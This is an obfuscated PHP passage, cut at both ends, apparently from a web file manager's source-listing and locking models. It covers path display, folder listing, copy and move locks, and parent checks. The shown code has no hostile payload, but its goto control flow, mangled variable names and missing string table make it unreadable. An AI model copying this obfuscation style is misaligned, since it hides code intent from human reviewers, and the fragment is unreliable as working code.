groupPathDisplay(&$b–Ï˜ƒÊ›•) { goto c­ÀáŞ¥©ç; A‰ùŞŞé‘: $b–Ï˜ƒÊ›•[$Dãá¼[495]] = $bá¢´ßœ . $CÎëšÔ‚œ÷[$Dãá¼[94]][$Dãá¼[399]]; goto a¤å´ƒŞÈ¼; Cù¾¨’ÖÛº: $b–Ï˜ƒÊ›•[$Dãá¼[491]] = $CÎëšÔ‚œ÷[$Dãá¼[481]]; $b–Ï˜ƒÊ›•[$Dãá¼[492]] = $CÎëšÔ‚œ÷[$Dãá¼[490]]; $b–Ï˜ƒÊ›•[$Dãá¼[493]] = $CÎëšÔ‚œ÷[$Dãá¼[494]]; goto A‰ùŞŞé‘; d¥µç Šˆ¯: $fâŸµ£Æ÷¥ = $this->parentLevelArray($CÎëšÔ‚œ÷[$Dãá¼[490]]); $bá¢´ßœ = $Dãá¼[43]; foreach ($fâŸµ£Æ÷¥ as $fÜ±ö–¬æ½) { $cÁƒ„×¨ÕÚ = Model($Dãá¼[489])->getInfo($fÜ±ö–¬æ½); $bá¢´ßœ .= $cÁƒ„×¨ÕÚ[$Dãá¼[94]][$Dãá¼[399]] . $Dãá¼[57]; } goto Cù¾¨’ÖÛº; c­ÀáŞ¥©ç: $Dãá¼ =& $_SERVER[¾÷]; if ($b–Ï˜ƒÊ›•[$Dãá¼[407]] != self::TYPE_GROUP) { return; } $CÎëšÔ‚œ÷ = Model($Dãá¼[489])->getInfo($b–Ï˜ƒÊ›•[$Dãá¼[487]]); goto d¥µç Šˆ¯; a¤å´ƒŞÈ¼: } protected function _listAppendPath(&$B£¿„±Á®) { goto FÉìƒåÙÃº; FÉìƒåÙÃº: $BŞÃÉâ =& $_SERVER[¾÷]; static $Bƒˆõé¹“ = array(); $C¨„õš¢í« = array(); goto BƒÒŒÄ°ìé; eåµ¸Óë‹¦: $C¨„õš¢í« = array_unique($C¨„õš¢í«); if (count($C¨„õš¢í«) > 0) { $FŞ‡ŒË¡š = array($BŞÃÉâ[413] => array($BŞÃÉâ[414], $C¨„õš¢í«)); if (count($C¨„õš¢í«) == 1) { $A¨ö—×½ = $this->sourceInfo($C¨„õš¢í«[0]); $d‹ ¼ñİÚã = is_array($A¨ö—×½) ? array($A¨ö—×½) : !1; } else { $d‹ ¼ñİÚã = $this->field($BŞÃÉâ[496])->where($FŞ‡ŒË¡š)->select(); } if (!$d‹ ¼ñİÚã) { $d‹ ¼ñİÚã = array(); } foreach ($d‹ ¼ñİÚã as $cò‚¡Üò) { $Bƒˆõé¹“[$cò‚¡Üò[$BŞÃÉâ[399]]] = $cò‚¡Üò[$BŞÃÉâ[38]]; } } $EãÎÓ¹éß = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto F•ÆìêÂ¦–; BƒÒŒÄ°ìé: $E’ñâ„çò” = array(); foreach ($B£¿„±Á® as &$cµ”‡ÂÓ‘¶) { $BÂÉÍ§¾ = $cµ”‡ÂÓ‘¶[$BŞÃÉâ[406]] == $BŞÃÉâ[96]; if ($BÂÉÍ§¾) { $Bƒˆõé¹“[$cµ”‡ÂÓ‘¶[$BŞÃÉâ[399]]] = $cµ”‡ÂÓ‘¶[$BŞÃÉâ[38]]; } if (isset($E’ñâ„çò”[$cµ”‡ÂÓ‘¶[$BŞÃÉâ[490]]])) { continue; } $E’ñâ„çò”[$cµ”‡ÂÓ‘¶[$BŞÃÉâ[490]]] = !0; $D›÷Å–…¤ö = $this->parentLevelArray($cµ”‡ÂÓ‘¶[$BŞÃÉâ[490]]); foreach ($D›÷Å–…¤ö as $CìƒíÁÌ§Š => $A¡ö‡­É®ø) { if ($CìƒíÁÌ§Š != 0 && !isset($Bƒˆõé¹“[$A¡ö‡­É®ø])) { $C¨„õš¢í«[] = $A¡ö‡­É®ø; } } } unset($cµ”‡ÂÓ‘¶); goto eåµ¸Óë‹¦; F•ÆìêÂ¦–: $EÁã¥„¥· = array(); $C™ÏÈØ¯ˆ = array(); foreach ($B£¿„±Á® as &$cµ”‡ÂÓ‘¶) { goto fùâ´‹ĞàÊ; aÖÆ”…—¸Ü: $cµ”‡ÂÓ‘¶[$BŞÃÉâ[498]] = str_replace($BŞÃÉâ[499], $BŞÃÉâ[18], $FíòÅ‰‘º); $B•ÏÀ³é– = trim($cµ”‡ÂÓ‘¶[$BŞÃÉâ[498]], $BŞÃÉâ[18]); if ($cµ”‡ÂÓ‘¶[$BŞÃÉâ[481]] == $BŞÃÉâ[500] && $B•ÏÀ³é–) { $cµ”‡ÂÓ‘¶[$BŞÃÉâ[38]] = $B•ÏÀ³é–; } goto E÷ô©š¨ó²; E÷ô©š¨ó²: if (intval($cµ”‡ÂÓ‘¶[$BŞÃÉâ[407]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($cµ”‡ÂÓ‘¶, $D›÷Å–…¤ö, $EãÎÓ¹éß); } goto c»Å¦Í³Ëš; fùâ´‹ĞàÊ: $fš¾í·ã£ = $cµ”‡ÂÓ‘¶[$BŞÃÉâ[490]]; if (isset($C™ÏÈØ¯ˆ[$fš¾í·ã£])) { $FíòÅ‰‘º = $EÁã¥„¥·[$fš¾í·ã£]; } else { $D›÷Å–…¤ö = $this->parentLevelArray($cµ”‡ÂÓ‘¶[$BŞÃÉâ[490]]); $fÔÄâôƒøÙ = $BŞÃÉâ[497] . $cµ”‡ÂÓ‘¶[$BŞÃÉâ[407]] . $BŞÃÉâ[443] . $cµ”‡ÂÓ‘¶[$BŞÃÉâ[487]]; if ($EÁã¥„¥·[$fÔÄâôƒøÙ]) { $FíòÅ‰‘º = $EÁã¥„¥·[$fÔÄâôƒøÙ]; } else { $FíòÅ‰‘º = $this->_listAppendPathRoot($cµ”‡ÂÓ‘¶, $D›÷Å–…¤ö); $EÁã¥„¥·[$fÔÄâôƒøÙ] = $FíòÅ‰‘º; } foreach ($D›÷Å–…¤ö as $CìƒíÁÌ§Š => $A¡ö‡­É®ø) { if ($CìƒíÁÌ§Š == 0 && $FíòÅ‰‘º && $cµ”‡ÂÓ‘¶[$BŞÃÉâ[407]] == self::TYPE_GROUP) { continue; } if (isset($Bƒˆõé¹“[$A¡ö‡­É®ø])) { $FíòÅ‰‘º .= $Bƒˆõé¹“[$A¡ö‡­É®ø] . $BŞÃÉâ[18]; } } if ($D›÷Å–…¤ö) { $FíòÅ‰‘º .= $cµ”‡ÂÓ‘¶[$BŞÃÉâ[38]]; } $EÁã¥„¥·[$fš¾í·ã£] = $FíòÅ‰‘º; } if ($cµ”‡ÂÓ‘¶[$BŞÃÉâ[406]]) { $FíòÅ‰‘º .= $BŞÃÉâ[18]; } goto aÖÆ”…—¸Ü; c»Å¦Í³Ëš: } goto bÕ©™‰ïØ; bÕ©™‰ïØ: unset($cµ”‡ÂÓ‘¶); return $B£¿„±Á®; goto a¯šÛ±ôÂê; a¯šÛ±ôÂê: } private function _listAppendPathRecycle(&$dìÓ£¶ö•ì, $d‡¥Ù‘ƒŸ¤, $aóß®è‚ïÄ) { goto cé¡§¦Í…½; BÏ–íÒÚíŠ: $aàÒ¨ÀÆ«½ = implode($A£ßŒÈØ–[18], array_slice($B‹ªô¤Â‹î, 2)); $dìÓ£¶ö•ì[$A£ßŒÈØ–[498]] = $A£ßŒÈØ–[18] . LNG($A£ßŒÈØ–[501]) . $A£ßŒÈØ–[18] . ltrim($aàÒ¨ÀÆ«½, $A£ßŒÈØ–[18]); $dìÓ£¶ö•ì[$A£ßŒÈØ–[490]] = $A£ßŒÈØ–[502] . implode($A£ßŒÈØ–[57], array_slice($d‡¥Ù‘ƒŸ¤, 1)) . $A£ßŒÈØ–[57]; goto fÀŠäß² ”; cé¡§¦Í…½: $A£ßŒÈØ– =& $_SERVER[¾÷]; if (!in_array($aóß®è‚ïÄ, $d‡¥Ù‘ƒŸ¤) && $dìÓ£¶ö•ì[$A£ßŒÈØ–[399]] != $aóß®è‚ïÄ) { return; } $B‹ªô¤Â‹î = explode($A£ßŒÈØ–[18], trim($dìÓ£¶ö•ì[$A£ßŒÈØ–[498]], $A£ßŒÈØ–[18])); goto BÏ–íÒÚíŠ; fÀŠäß² ”: if ($dìÓ£¶ö•ì[$A£ßŒÈØ–[399]] == $aóß®è‚ïÄ) { $dìÓ£¶ö•ì[$A£ßŒÈØ–[490]] = $A£ßŒÈØ–[502]; $dìÓ£¶ö•ì[$A£ßŒÈØ–[481]] = $A£ßŒÈØ–[500]; $dìÓ£¶ö•ì[$A£ßŒÈØ–[38]] = LNG($A£ßŒÈØ–[501]); } $dìÓ£¶ö•ì[$A£ßŒÈØ–[503]] = $A£ßŒÈØ–[504]; goto d”½ÙÉ’Îì; d”½ÙÉ’Îì: } protected function _listAppendPathRoot(&$CÊœÏ›, $eé†×¹½„ˆ) { $dš­Ïç¦‚ê =& $_SERVER[¾÷]; $E³¹•Äã½ = $dš­Ïç¦‚ê[43]; if ($CÊœÏ›[$dš­Ïç¦‚ê[407]] == self::TYPE_USER) { if (defined($dš­Ïç¦‚ê[457]) && $CÊœÏ›[$dš­Ïç¦‚ê[487]] == USER_ID) { $E³¹•Äã½ = LNG($dš­Ïç¦‚ê[505]); if (!$eé†×¹½„ˆ) { $CÊœÏ›[$dš­Ïç¦‚ê[38]] = $E³¹•Äã½; } } else { $Bö¾µ…Šİ  = Model($dš­Ïç¦‚ê[506])->getInfoSimple($CÊœÏ›[$dš­Ïç¦‚ê[487]]); $E³¹•Äã½ = LNG($dš­Ïç¦‚ê[507]) . $dš­Ïç¦‚ê[169] . $Bö¾µ…Šİ [$dš­Ïç¦‚ê[38]] . $dš­Ïç¦‚ê[508]; } } else { if ($CÊœÏ›[$dš­Ïç¦‚ê[407]] == self::TYPE_GROUP) { $Bö¾µ…Šİ  = Model($dš­Ïç¦‚ê[489])->getInfoSimple($CÊœÏ›[$dš­Ïç¦‚ê[487]]); $E³¹•Äã½ = $Bö¾µ…Šİ [$dš­Ïç¦‚ê[38]]; } else { if ($CÊœÏ›[$dš­Ïç¦‚ê[407]] == self::TYPE_SYSTEM) { $E³¹•Äã½ = $dš­Ïç¦‚ê[509]; } } } $E³¹•Äã½ = $E³¹•Äã½ ? $dš­Ïç¦‚ê[18] . $E³¹•Äã½ . $dš­Ïç¦‚ê[18] : $dš­Ïç¦‚ê[18]; return $E³¹•Äã½; } protected function _listAppendUser(&$cÇçŸ¿¯…) { goto eêÀ’ÔĞ; fÈœÁæÚïˆ: $aÖ§ÙÃÌã = array_merge($CÜà¦äôÁ‡, $dâ¢‰šÓï¥); $a‹…ĞÇç‘Å = Model($c‚ğêºÌ«[510])->userListInfo($aÖ§ÙÃÌã); foreach ($cÇçŸ¿¯… as &$D–‡ğ…À‘õ) { $bµ¢Íºó– = $D–‡ğ…À‘õ[$c‚ğêºÌ«[435]]; $D–‡ğ…À‘õ[$c‚ğêºÌ«[435]] = $a‹…ĞÇç‘Å[$bµ¢Íºó–] ? $a‹…ĞÇç‘Å[$bµ¢Íºó–] : !1; $bµ¢Íºó– = $D–‡ğ…À‘õ[$c‚ğêºÌ«[437]]; $D–‡ğ…À‘õ[$c‚ğêºÌ«[437]] = $a‹…ĞÇç‘Å[$bµ¢Íºó–] ? $a‹…ĞÇç‘Å[$bµ¢Íºó–] : !1; if (isset($D–‡ğ…À‘õ[$c‚ğêºÌ«[448]]) && $D–‡ğ…À‘õ[$c‚ğêºÌ«[448]][$c‚ğêºÌ«[511]]) { $BæŠó¬¤Å = $GLOBALS[$c‚ğêºÌ«[16]][$c‚ğêºÌ«[97]][$c‚ğêºÌ«[512]]; if ($D–‡ğ…À‘õ[$c‚ğêºÌ«[448]][$c‚ğêºÌ«[513]] <= time() - $BæŠó¬¤Å) { $this->metaSet($D–‡ğ…À‘õ[$c‚ğêºÌ«[399]], $c‚ğêºÌ«[511], null); $this->metaSet($D–‡ğ…À‘õ[$c‚ğêºÌ«[399]], $c‚ğêºÌ«[513], null); unset($D–‡ğ…À‘õ[$c‚ğêºÌ«[448]][$c‚ğêºÌ«[511]]); continue; } $CïË¼Ø‹‚£ = $D–‡ğ…À‘õ[$c‚ğêºÌ«[448]][$c‚ğêºÌ«[511]]; $D–‡ğ…À‘õ[$c‚ğêºÌ«[448]][$c‚ğêºÌ«[514]] = Model($c‚ğêºÌ«[510])->getInfoSimpleOuter($CïË¼Ø‹‚£); } } goto bÃÉÖ¨ÊÎ; bÃÉÖ¨ÊÎ: unset($D–‡ğ…À‘õ); goto Aµ¬İÉ«á; eêÀ’ÔĞ: $c‚ğêºÌ« =& $_SERVER[¾÷]; $CÜà¦äôÁ‡ = array_to_keyvalue($cÇçŸ¿¯…, $c‚ğêºÌ«[43], $c‚ğêºÌ«[435]); $dâ¢‰šÓï¥ = array_to_keyvalue($cÇçŸ¿¯…, $c‚ğêºÌ«[43], $c‚ğêºÌ«[437]); goto fÈœÁæÚïˆ; Aµ¬İÉ«á: } public function parentLevelArray($DŠœËğä×) { $CÒÈÃôœÅœ =& $_SERVER[¾÷]; $DŠœËğä× = explode($CÒÈÃôœÅœ[57], trim($DŠœËğä×, $CÒÈÃôœÅœ[57])); return array_remove_value($DŠœËğä×, $CÒÈÃôœÅœ[500]); } public function listAll($EŠöÓ‹ó¡õ) { goto A‘ÊŸŸ¢³Ã; Cô¡ñ…”îï: $f‹Ô­ŒÁÏÂ = array_to_keyvalue($f‹Ô­ŒÁÏÂ, $CËï‡‰’×»[399]); $dó“ äØ¤¬ = "\57{$føó–»¨¾[$CËï‡‰’×»[38]]}\57"; $dó“ äØ¤¬ = $dó“ äØ¤¬ == $CËï‡‰’×»[499] ? $CËï‡‰’×»[18] : $dó“ äØ¤¬; goto Eƒ’Ãñ™†¼; aÀ…ªè‘¯ì: $this->_listAppendAuth($f‹Ô­ŒÁÏÂ); $this->_listAppendUser($f‹Ô­ŒÁÏÂ); $this->_listAppendPath($f‹Ô­ŒÁÏÂ); goto Cô¡ñ…”îï; A‘ÊŸŸ¢³Ã: $CËï‡‰’×» =& $_SERVER[¾÷]; $føó–»¨¾ = $this->sourceInfo($EŠöÓ‹ó¡õ); $b…¹³¶‚ƒ = array($CËï‡‰’×»[515] => array($CËï‡‰’×»[516], $føó–»¨¾[$CËï‡‰’×»[490]] . $EŠöÓ‹ó¡õ . $CËï‡‰’×»[517]), $CËï‡‰’×»[518] => 0); goto BÄ®âºÄ´Ê; BÄ®âºÄ´Ê: $Aóâã‘¶Úâ = $CËï‡‰’×»[519]; $aª×ùÒ£ä = "\114\105\x46\x54\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\157\x5f\146\151\x6c\x65\x20\146\151\x6c\x65\40\157\156\40\163\157\165\162\143\145\56\146\x69\154\145\x49\x44\x20\75\x20\146\151\x6c\x65\56\x66\x69\x6c\145\x49\104"; $f‹Ô­ŒÁÏÂ = $this->alias($CËï‡‰’×»[520])->field($Aóâã‘¶Úâ)->where($b…¹³¶‚ƒ)->join($aª×ùÒ£ä)->select(); goto aÀ…ªè‘¯ì; Eƒ’Ãñ™†¼: $Dª‹Ã‹§£ = array(); foreach ($f‹Ô­ŒÁÏÂ as $D¶·¦îÕÜÓ => $A¡ñù¡¥íÓ) { goto AÚøÔÌö°‚; AÚøÔÌö°‚: $DÜ•ÈªÁÃ° = $this->parentLevelArray($A¡ñù¡¥íÓ[$CËï‡‰’×»[490]]); array_shift($DÜ•ÈªÁÃ°); $C„ŒÅ©ˆ•• = $dó“ äØ¤¬; goto cÍ¤ã„çÅ©; cÍ¤ã„çÅ©: for ($CÇÚ¬ŸØ = 0; $CÇÚ¬ŸØ < count($DÜ•ÈªÁÃ°); $CÇÚ¬ŸØ++) { $C„ŒÅ©ˆ•• .= $f‹Ô­ŒÁÏÂ[$DÜ•ÈªÁÃ°[$CÇÚ¬ŸØ]][$CËï‡‰’×»[38]] . $CËï‡‰’×»[18]; } $C„ŒÅ©ˆ•• .= $A¡ñù¡¥íÓ[$CËï‡‰’×»[38]]; if ($A¡ñù¡¥íÓ[$CËï‡‰’×»[406]]) { $C„ŒÅ©ˆ•• .= $CËï‡‰’×»[18]; } goto aêÓ¥ªÒâô; B‹µ¼Ï‡”Ù: if (!$A¡ñù¡¥íÓ[$CËï‡‰’×»[406]]) { $E·¡šƒ¹Á[$CËï‡‰’×»[450]] = $A¡ñù¡¥íÓ[$CËï‡‰’×»[450]]; $E·¡šƒ¹Á[$CËï‡‰’×»[95]] = $A¡ñù¡¥íÓ[$CËï‡‰’×»[85]]; } $Dª‹Ã‹§£[] = $E·¡šƒ¹Á; goto E×åŸôùø‚; aêÓ¥ªÒâô: $C„ŒÅ©ˆ•• = str_replace($CËï‡‰’×»[499], $CËï‡‰’×»[18], $C„ŒÅ©ˆ••); $C„ŒÅ©ˆ•• = str_replace($CËï‡‰’×»[499], $CËï‡‰’×»[18], $C„ŒÅ©ˆ••); $E·¡šƒ¹Á = array($CËï‡‰’×»[417] => str_replace($CËï‡‰’×»[499], $CËï‡‰’×»[18], $C„ŒÅ©ˆ••), $CËï‡‰’×»[521] => intval($A¡ñù¡¥íÓ[$CËï‡‰’×»[406]]), $CËï‡‰’×»[94] => $this->pathInfoFilter($A¡ñù¡¥íÓ)); goto B‹µ¼Ï‡”Ù; E×åŸôùø‚: } return $Dª‹Ã‹§£; goto E›×ƒÃ£ò; E›×ƒÃ£ò: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($FÔõé·ï›) { goto Eóøë¼Ù; f£Ô·‘è¸‰: $c‹Ë´ó« = 1; $this->_lockEvent($FÔõé·ï›, array($AéÜÂÑèâ[523], $AéÜÂÑèâ[524]), $c‹Ë´ó«); $this->_lockParent($FÔõé·ï›, array($AéÜÂÑèâ[524]), $c‹Ë´ó«); goto aïÇ“»‘­Ş; aïÇ“»‘­Ş: $this->_lockEvent($FÔõé·ï›, array($AéÜÂÑèâ[525], $AéÜÂÑèâ[526]), $c‹Ë´ó«); $this->_lockCheckEnd($AéÜÂÑèâ[522], $FÔõé·ï›); goto c¥šá­¥Ú…; Eóøë¼Ù: $AéÜÂÑèâ =& $_SERVER[¾÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($AéÜÂÑèâ[522], $FÔõé·ï›); goto f£Ô·‘è¸‰; c¥šá­¥Ú…: } public function lockCopyEnd($f”§åÏ¶È÷) { $bŠŸ‹Ÿö¸É =& $_SERVER[¾÷]; if (!$this->allowLock()) { return; } $E¨Úñ¯Ûù = 0; $this->_lockEvent($f”§åÏ¶È÷, array($bŠŸ‹Ÿö¸É[523], $bŠŸ‹Ÿö¸É[524]), $E¨Úñ¯Ûù); $this->_lockParent($f”§åÏ¶È÷, array($bŠŸ‹Ÿö¸É[524]), $E¨Úñ¯Ûù); $this->_lockEvent($f”§åÏ¶È÷, array($bŠŸ‹Ÿö¸É[525], $bŠŸ‹Ÿö¸É[526]), $E¨Úñ¯Ûù); } public function lockWriteStart($D³ö”½Œ¿Ø, $A¡Ğ½¨”ß© = '') { goto A”¶ò«¥¡; A”¶ò«¥¡: $A•ùè‘ˆ‡ù =& $_SERVER[¾÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($A•ùè‘ˆ‡ù[523], $D³ö”½Œ¿Ø); goto FïÇÃœš°; Fœ—„ö¼©î: $this->_lockParent($D³ö”½Œ¿Ø, array($A•ùè‘ˆ‡ù[522], $A•ùè‘ˆ‡ù[524]), $cÜ©ƒÛä¹Ø); $this->_lockCheckEnd($A•ùè‘ˆ‡ù[523], $D³ö”½Œ¿Ø); goto BĞŒ¢¼‹åó; FïÇÃœš°: $cÜ©ƒÛä¹Ø = 1; $this->_lockKey($A•ùè‘ˆ‡ù[527] . $D³ö”½Œ¿Ø . $A•ùè‘ˆ‡ù[104] . $A¡Ğ½¨”ß©, $cÜ©ƒÛä¹Ø); $this->_lockEvent($D³ö”½Œ¿Ø, array($A•ùè‘ˆ‡ù[522], $A•ùè‘ˆ‡ù[524]), $cÜ©ƒÛä¹Ø); goto Fœ—„ö¼©î; BĞŒ¢¼‹åó: } public function lockWriteEnd($a¤¡í×‚›õ, $AÇˆ —§ = '') { $C¤®ÛìÄ =& $_SERVER[¾÷]; if (!$this->allowLock()) { return; } $cî˜–­öµ– = 0; $this->_lockKey($C¤®ÛìÄ[527] . $a¤¡í×‚›õ . $C¤®ÛìÄ[104] . $AÇˆ —§, $cî˜–­öµ–); $this->_lockEvent($a¤¡í×‚›õ, array($C¤®ÛìÄ[522], $C¤®ÛìÄ[524]), $cî˜–­öµ–); $this->_lockParent($a¤¡í×‚›õ, array($C¤®ÛìÄ[522], $C¤®ÛìÄ[524]), $cî˜–­öµ–); } public function lockMoveStart($E¶ÆÆîïÜ) { goto aˆìîŒö”ë; Eù·ß»ŒÙ: $this->_lockParent($E¶ÆÆîïÜ, array($eÙŒÃÕ ä[522], $eÙŒÃÕ ä[524]), $dƒà‰ùÏ); $this->_lockEvent($E¶ÆÆîïÜ, array($eÙŒÃÕ ä[529], $eÙŒÃÕ ä[525], $eÙŒÃÕ ä[526]), $dƒà‰ùÏ); $this->_lockCheckEnd($eÙŒÃÕ ä[524], $E¶ÆÆîïÜ); goto eš²ğÍ‰ò‡; cˆô†¥’Š: $dƒà‰ùÏ = 1; $this->_lockKey($eÙŒÃÕ ä[528] . $E¶ÆÆîïÜ, $dƒà‰ùÏ); $this->_lockEvent($E¶ÆÆîïÜ, array($eÙŒÃÕ ä[522], $eÙŒÃÕ ä[523]), $dƒà‰ùÏ); goto Eù·ß»ŒÙ; aˆìîŒö”ë: $eÙŒÃÕ ä =& $_SERVER[¾÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($eÙŒÃÕ ä[524], $E¶ÆÆîïÜ); goto cˆô†¥’Š; eš²ğÍ‰ò‡: } public function lockMoveEnd($F˜Ü©ƒ™à‘) { goto a¤¸æÂçê¨; a¤¸æÂçê¨: $Aåòá©÷æª =& $_SERVER[¾÷]; if (!$this->allowLock()) { return; } $cÜã×è¬‡ = 0; goto a¿ãÊàåª; eó÷Õ‰˜: $this->_lockEvent($F˜Ü©ƒ™à‘, array($Aåòá©÷æª[529], $Aåòá©÷æª[525], $Aåòá©÷æª[526]), $cÜã×è¬‡); goto EÇ§¹Ó‚¢ƒ; a¿ãÊàåª: $this->_lockKey($Aåòá©÷æª[528] . $F˜Ü©ƒ™à‘, $cÜã×è¬‡); $this->_lockEvent($F˜Ü©ƒ™à‘, array($Aåòá©÷æª[522], $Aåòá©÷æª[523]), $cÜã×è¬‡); $this->_lockParent($F˜Ü©ƒ™à‘, array($Aåòá©÷æª[522], $Aåòá©÷æª[524]), $cÜã×è¬‡); goto eó÷Õ‰˜; EÇ§¹Ó‚¢ƒ: } private function _lockCheck($aƒÂíîˆ·Œ, $C†Õ¿ã©‡) { goto dİÚ‚öŠ¦«; BÏ¨³ò¬âó: $this->_lockTimeStart[$DôÃ¬Óõ–’] = timeFloat(); if (!is_array($b‡í½Çà¸é)) { return; } $fï‹§¥ò´¨ = LNG($dŠçŠÑ‚ä[530]); goto C´§îÀçùÒ; dİÚ‚öŠ¦«: $dŠçŠÑ‚ä =& $_SERVER[¾÷]; $b‡í½Çà¸é = $this->sourceInfo($C†Õ¿ã©‡); $DôÃ¬Óõ–’ = $aƒÂíîˆ·Œ . $dŠçŠÑ‚ä[104] . $C†Õ¿ã©‡; goto BÏ¨³ò¬âó; DÇñÏŠ: $eØº„à¢ = array_reverse($this->parentLevelArray($b‡í½Çà¸é[$dŠçŠÑ‚ä[490]])); foreach ($eØº„à¢ as $F–‘ğ›·è—) { $DôÃ¬Óõ–’ = $aƒÂíîˆ·Œ . $dŠçŠÑ‚ä[531] . $F–‘ğ›·è—; if (CacheLock::lockGet($dŠçŠÑ‚ä[532] . $DôÃ¬Óõ–’)) { $b‡í½Çà¸é = $this->sourceInfo($F–‘ğ›·è—); CacheLock::setErrorMsg($dŠçŠÑ‚ä[169] . htmlspecialchars($b‡í½Çà¸é[$dŠçŠÑ‚ä[38]]) . $dŠçŠÑ‚ä[508] . $fï‹§¥ò´¨); $this->_lockKey($DôÃ¬Óõ–’, 1); $this->_lockKey($DôÃ¬Óõ–’, 0); } } goto aˆäÙÄÅ¾; C´§îÀçùÒ: CacheLock::setErrorMsg($dŠçŠÑ‚ä[169] . htmlspecialchars($b‡í½Çà¸é[$dŠçŠÑ‚ä[38]]) . $dŠçŠÑ‚ä[508] . $fï‹§¥ò´¨); $this->_lockKey($DôÃ¬Óõ–’, 1); $this->_lockKey($DôÃ¬Óõ–’, 0); goto DÇñÏŠ; aˆäÙÄÅ¾: } private function _lockCheckEnd($AÕŸéäà÷, $b¤¿‰Å‡æŒ) { goto D™¬§±‹¶; cÇÒÈÙ…Ÿ: if (!isset($this->_lockTimeStart[$dá¥ÔÅÛ¤])) { return; } $a‹ÔØ¾‡ó× = timeFloat() - $this->_lockTimeStart[$dá¥ÔÅÛ¤]; unset($this->_lockTimeStart[$dá¥ÔÅÛ¤]); goto d¯ã¥â¶; D™¬§±‹¶: $Fßœ²äƒ½¿ =& $_SERVER[¾÷]; $dá¥ÔÅÛ¤ = $AÕŸéäà÷ . $Fßœ²äƒ½¿[104] . $b¤¿‰Å‡æŒ; CacheLock::setErrorMsg($Fßœ²äƒ½¿[382]); goto cÇÒÈÙ…Ÿ; d¯ã¥â¶: if ($a‹ÔØ¾‡ó× > 0.5) { unset(self::$cacheSourceInfo[$Fßœ²äƒ½¿[441] . $b¤¿‰Å‡æŒ]); } $f¶¦µŒ¿äÉ = $this->sourceInfo($b¤¿‰Å‡æŒ); if (!$f¶¦µŒ¿äÉ) { show_json(LNG($Fßœ²äƒ½¿[114]), !1); } goto Eà„”˜Çù; Eà„”˜Çù: } private function _lockParent($C…ĞãææÌ†, $f›îÑŠ”ñ¢, $e½ĞÎñ¸Ü¥) { if (!$this->autoLockSet) { return; } $F›Äİ¼®Å = $this->sourceInfo($C…ĞãææÌ†); if (!is_array($F›Äİ¼®Å)) { return; } $c‘¯ù®±¤ = array_reverse($this->parentLevelArray($F›Äİ¼®Å[$_SERVER[¾÷][490]])); foreach ($c‘¯ù®±¤ as $FÛÀª©±) { $this->_lockEvent($FÛÀª©±, $f›îÑŠ”ñ¢, $e½ĞÎñ¸Ü¥); } } private function _lockEvent($Aœ•”ìŞÀæ, $F·‹¶ğâêå, $c¸¤åîÀ£§) { $B´Ñà†ÖÍ‘ =& $_SERVER[¾÷]; if (!$this->autoLockSet) { return; } foreach ($F·‹¶ğâêå as $aÏíáòÀ) { $a£ÙÒôææ = $aÏíáòÀ . $B´Ñà†ÖÍ‘[104] . $Aœ•”ìŞÀæ; if ($c¸¤åîÀ£§ && CacheLock::lockGet($B´Ñà†ÖÍ‘[532] . $a£ÙÒôææ)) { continue; } $this->_lockKey($a£ÙÒôææ, $c¸¤åîÀ£§); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($b°Ëá‡Èï, $BÁ“º²†ğ = 1) { $Bö®’¤²£  = $_SERVER[¾÷][532] . md5($b°Ëá‡Èï); if ($BÁ“º²†ğ) { if (isset(self::$_lockItemArr[$Bö®’¤²£ ])) { return; } self::$_lockItemArr[$Bö®’¤²£ ] = 1; CacheLock::lock($Bö®’¤²£ , $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Bö®’¤²£ ])) { return; } unset(self::$_lockItemArr[$Bö®’¤²£ ]); CacheLock::unlock($Bö®’¤²£ ); } } public function isParentOf($e‚ÀÙ¢¨, $a“„¾Ò§×) { goto Cİ¸ÉÏ‹ì; C˜»èô÷ˆ¨: return $F†“õ‚‘·„; goto Bášå’¸ë; f¸Ê †’”İ: $eß¿–¢¡‡´ = $dËªëêèùè[$D¬„“ø”º¯[490]] . $dËªëêèùè[$D¬„“ø”º¯[399]] . $D¬„“ø”º¯[57]; $d–ï˜­±àÈ = $aÑÕáâ®½[$D¬„“ø”º¯[490]] . $aÑÕáâ®½[$D¬„“ø”º¯[399]] . $D¬„“ø”º¯[57]; $F†“õ‚‘·„ = strpos($d–ï˜­±àÈ, $eß¿–¢¡‡´) === 0; goto C˜»èô÷ˆ¨; Cİ¸ÉÏ‹ì: $D¬„“ø”º¯ =& $_SERVER[¾÷]; $dËªëêèùè = $this->sourceInfo($e‚ÀÙ¢¨); $aÑÕáâ®½ = $this->sourceInfo($a“„¾Ò§×); goto f¸Ê †’”İ; Bášå’¸ë: } private $targetIsDelete = 0; public function copy($CÓÚÉ¨ÊÉƒ, $Aé¥Ÿ çˆ«, $a‡“à˜ó‚— = REPEAT_REPLACE, $B§àùÂë¶œ = '') { goto Fö¹š Ùìï; C£¼óó¼ö : $this->targetIsDelete = intval($cÃ»Ã™Ãå[$EÔôÒ¨ÚÓŠ[426]]); $BÕùÃà†‘ = $this->fileNameExistCache($Aé¥Ÿ çˆ«, $cÃ»Ã™Ãå[$EÔôÒ¨ÚÓŠ[38]]); $e°ëÑ”ÈÁ• = $this->_copy($CÓÚÉ¨ÊÉƒ, $Aé¥Ÿ çˆ«, $a‡“à˜ó‚—, $FÑÙºÍøğ…, !0, $B§àùÂë¶œ); goto f¤»õ»›Ó–; A«…•íÛº•: if (!$cÃ»Ã™Ãå || !$B·ÅùšÅ® || $B·ÅùšÅ®[$EÔôÒ¨ÚÓŠ[406]] != $EÔôÒ¨ÚÓŠ[96]) { return !1; } if ($this->isParentOf($CÓÚÉ¨ÊÉƒ, $Aé¥Ÿ çˆ«)) { return !1; } $dİìÉ‹Ìºİ = $B§àùÂë¶œ ? $B§àùÂë¶œ : $cÃ»Ã™Ãå[$EÔôÒ¨ÚÓŠ[38]]; goto d„§ø…œŸØ; b‹‰ã¦¶´: $this->updateModifyTime($Aé¥Ÿ çˆ«); return 